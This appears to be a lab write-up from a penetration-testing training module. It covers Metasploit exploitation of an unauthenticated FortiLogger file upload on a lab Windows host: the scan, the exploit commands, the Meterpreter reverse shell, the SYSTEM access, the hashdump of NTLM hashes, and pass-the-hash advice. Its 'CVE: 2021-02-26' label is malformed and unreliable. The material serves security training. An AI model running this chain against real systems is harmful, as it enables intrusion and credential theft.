**Module:** Using the Metasploit Framework  
**Target:** 10.129.203.65  
**Attacker:** 10.10.14.171
### Enumeration
```bash
db_nmap -sV -sS -sC 10.129.203.65 --min-rate 1000
```

**Findings:**
- Port 135: Microsoft Windows RPC
- Port 139: NetBIOS
- Port 445: SMB (signing enabled but not required)
- Port 3389: RDP — Windows 10.0.17763 (Server 2019), hostname `WIN-51BJ97BCIPV`
- Port 5000: HTTP — Microsoft IIS 10.0 running **FortiLogger | Log and Report System**
### Exploitation — FortiLogger Arbitrary File Upload
Searched for a FortiLogger exploit:
```bash
search FortiLogger
use exploit/windows/http/fortilogger_arbitrary_fileupload
```

**CVE:** 2021-02-26 — Unauthenticated arbitrary file upload in FortiLogger < 5.2.0. Target confirmed running version 4.4.2.2.
```bash
set RHOSTS 10.129.203.65
set LHOST 10.10.14.171
run
```

Exploit generated and uploaded a malicious payload, executed it remotely, and opened a Meterpreter session.
```
[*] Meterpreter session 3 opened (10.10.14.171:4444 -> 10.129.203.65:49686)
```
### Post-Exploitation
Checked current user immediately after foothold:
```bash
getuid
# Server username: NT AUTHORITY\SYSTEM
```

FortiLogger service runs as SYSTEM directly — no privilege escalation needed.

Confirmed Windows version via shell:
```bash
shell
# Microsoft Windows [Version 10.0.17763.2628]
```
### Credential Dumping
```bash
hashdump
```

**Results:**

|User|RID|NTLM Hash|
|---|---|---|
|Administrator|500|`bdaffbfe64f1fc646a3353be1c2c3c99`|
|htb-student|1002|`cf3a5525ee9414229e66279623ed5c58`|
|Guest|501|`31d6cfe0d16ae931b73c59d7e0c089c0`|
|DefaultAccount|503|`31d6cfe0d16ae931b73c59d7e0c089c0`|
|WDAGUtilityAccount|504|`4b4ba140ac0767077aee1958e7f78070`|

> Note: The LM hash column shows `aad3b435b51404eeaad3b435b51404ee` for all users — this is the null LM hash, meaning LM authentication is disabled on this system (standard on modern Windows). Only NTLM hashes are relevant here.

### Attack Chain Summary
```
Nmap scan → FortiLogger 4.4.2.2 on port 5000
→ Arbitrary file upload (CVE-2021-02-26) → shell as NT AUTHORITY\SYSTEM
→ hashdump → NTLM hashes for all local accounts
```
### Lessons Learned
- SMB signing enabled but not required is a flag worth noting — NTLM relay attacks may be viable in a network context
- FortiLogger running as SYSTEM is a severe misconfiguration — a single unauthenticated file upload gives immediate full control
- The null LM hash (`aad3b435b51404eeaad3b435b51404ee`) appearing for all users confirms LM is disabled — don't waste time trying to crack those
- `hashdump` requires SYSTEM — always verify `getuid` before attempting it
- NTLM hashes can be used directly for Pass-the-Hash attacks against other services (SMB, RDP, WinRM) without cracking